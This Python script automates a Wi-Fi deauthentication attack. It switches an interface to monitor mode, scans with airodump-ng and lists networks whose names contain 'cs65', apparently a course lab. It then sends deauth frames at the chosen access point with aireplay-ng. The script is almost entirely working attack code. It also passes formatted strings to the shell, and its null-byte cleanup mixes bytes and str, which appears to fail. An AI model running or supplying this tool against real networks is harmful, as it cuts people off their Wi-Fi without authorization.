from subprocess import Popen, PIPE, check_output
import os
import signal
import time
import csv

## null device
DN = open(os.devnull, 'w')
## list of monitor mode enabled interfaces
mon = list()

## list for the interfaces in normal state
ifaces = list()


#################################
### STEP 1 - SCANNING SIGNALS ###
#################################
## Executes iwconfig
proc = Popen(['iwconfig'], stdout=PIPE, stderr=DN)

## Splits output in ines
for line in proc.communicate()[0].split( b'\n' ):
	iface = line[:line.find(b' ')].decode('utf-8')
	## save monitor mode ifaces
	if 'Mode:Monitor' in iface:
		mon.append( iface )
	## save normal state ifaces
	elif b'IEEE 802.11' in line:
		if b"ESSID:\"" in line:
			ifaces.append( iface )
		else:
			ifaces.append( iface )

## Interface count
icount = 0
## Dictionary containing all interfaces
allface = list()

## if have monitor enabled monitors display them
if len( mon ) > 0:
	print( "Monitor mode enabled interface(s):" )
	for iface in mon:
		print( "[{}] {}".format( icount, iface ) )
		allface.append( str( iface ) )
		icount += 1

## if no interfaces, exit
if len( ifaces ) < 1:
	print( "Error, no interfaces available" )
	exit()

## if interfaces, display them
else:
	print( "Interfaces available for monitor mode:" )
	for iface in ifaces:
		print( "[{}] {}".format( icount, iface ) )
		allface.append( str( iface ) )
		icount += 1

selected = False
while not selected:
	select = input( "Select wich interface to use: " )
	select = int(select)
	if select <= len( allface ) - 1:
		selected = True
	else:
		print( "Invalid option {}".format( select ) )

## sets selected interface
iface = allface[select]

### Enables monitor mode on the selected interface
## turn off interface
Popen(['ifconfig {} down'.format( iface )], shell=True, stdout=PIPE )
## enable monitor
Popen(['iwconfig {} mode monitor'.format( iface )], shell=True, stdout=PIPE )
## turn on interface
Popen(['ifconfig {} up'.format( iface ) ], shell=True, stdout=PIPE )

print( "Monitor mode enabled for interface: {}".format( iface ) )

## thanks to ojef http://stackoverflow.com/questions/13062865/is-python-subprocess-module-quirky
## for the airodump handling
try:
	airodump = Popen(["airodump-ng","-w","airo","--output-format","csv","{}".format( iface )])
	time.sleep(20)
	#os.killpg( os.getpgid( airodump.pid ), signal.SIGTERM )
	## thanks to wim http://stackoverflow.com/questions/6488275/terminal-text-becomes-invisible-after-terminating-subprocess
	airodump.send_signal(signal.SIGTERM)
	airodump.kill()
	airodump.wait()
except Exception as e:
	print( e )

######################################
### STEP 2 - CHOOSE TARGET NETWORK ###
######################################
try:
	while True:
		## Prepares valid targets
		targets = list()
		print( "\n\n####################################################################" )
		print( "#\tBSSID\t\t\tESSID\t\tChannel\tSecurity")
		## Read from csv file
		## Fixes nullbytes error
		fi = open('airo-01.csv', 'rb')
		data = fi.read()
		fi.close()
		fo = open('clean-airo-01.csv', 'wb')
		fo.write(data.replace('\x00', ''))
		fo.close()
		with open('clean-airo-01.csv') as csvfile:
			reader = csv.reader(csvfile)
			## networks index
			i = 0
			for row in reader:
				if ":" in " ".join(row):
					if "cs65" in row[13]:
						print( "{}\t{}\t{}\t{}\t{}".format( i, row[0], row[13], row[3], row[5] ) )
						targets.append( row )
						i += 1
			print( "####################################################################" )
		selected = False
		while not selected:
			select = input( "\nChoose a network to jam (will not be echoed) [{}-{}]: ".format(0, i-1) )
			select = int(select)
			if select <= len( targets ) - 1:
				selected = True
			else:
				print( "Invalid option {}".format( select ) )
		target = targets[select]

		print( "You have selected network:" )
		print( "BSSID\t\t\tESSID\t\tChannel\tSecurity" )
		print( "{}\t{}\t{}\t{}".format(target[0], target[13], target[3], target[5] ) )

		## Bob marley - Jamming
		print( "\nStarting Attack" )
		aireplay = Popen(['aireplay-ng --deauth 5 -a {} {}'.format( target[0], iface )], shell=True)
		time.sleep(5)
		aireplay.terminate()
		aireplay.wait()
		print( "\nAttack Completed" )
except Exception as e:
	print( "\n\n\n###################################\n###")
	print( "### What a shame, an error occurred\n### Details:")
	print( e )
	print( "###################################" )